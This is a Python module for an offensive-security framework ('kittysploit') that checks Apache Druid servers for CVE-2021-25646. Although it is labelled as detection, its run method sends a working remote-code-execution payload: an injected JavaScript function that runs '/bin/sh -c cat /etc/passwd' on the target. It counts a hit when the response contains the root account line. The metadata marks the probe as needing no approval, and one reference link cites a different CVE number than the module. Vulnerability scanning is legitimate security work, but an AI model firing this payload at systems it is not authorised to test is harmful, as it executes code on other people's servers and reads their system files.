#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Apache Druid is susceptible to remote code execution because by default it lacks authorization and authenticat."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Apache Druid - Remote Code Execution Detection',
        'description': 'Apache Druid is susceptible to remote code execution because by default it lacks authorization and authentication. Attackers can send specially crafted requests to execute arbitrary code with the privileges of processes on the Druid server.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'apache', 'rce', 'druid', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://paper.seebug.org/1476/',
            'https://lists.apache.org/thread.html/rfda8a3aa6ac06a80c5cbfdeae0fc85f88a5984e32ea05e6dda46f866%40%3Cdev.druid.apache.org%3E',
            'http://www.openwall.com/lists/oss-security/2021/01/29/6',
            'https://lists.apache.org/thread.html/r64431c2b97209f566b5dff92415e7afba0ed3bfab4695ebaa8a62e5d@%3Cdev.druid.apache.org%3E',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-25864',
        ],
        'cve': 'CVE-2021-25646',
    }

    def run(self):
        path = '/druid/indexer/v1/sampler'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'}, data='{\n"type":"index",\n"spec":{\n   "ioConfig":{\n      "type":"index",\n      "firehose":{\n         "type":"local",\n         "baseDir":"/etc",\n         "filter":"passwd"\n      }\n   },\n   "dataSchema":{\n      "dataSource":"odgjxrrrePz",\n      "parser":{\n         "parseSpec":{\n            "format":"javascript",\n            "timestampSpec":{\n\n            },\n            "dimensionsSpec":{\n\n            },\n            "function":"function(){var hTVCCerYZ = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\\"/bin/sh`@~-c`@~cat /etc/passwd\\".split(\\"`@~\\")).getInputStream()).useDelimiter(\\"\\\\A\\").next();return {timestamp:\\"4137368\\",OQtGXcxBVQVL: hTVCCerYZ}}",\n            "":{\n               "enabled":"true"\n            }\n         }\n      }\n   }\n},\n"samplerConfig":{\n   "numRows":10\n}\n}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('numRowsRead', 'numRowsIndexed',)
        header_any = ('application/json',)
        body_regexes = ('root:.*:0:0:',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='high', reason='Apache Druid - Remote Code Execution detected', path=path)
            return True
        return False

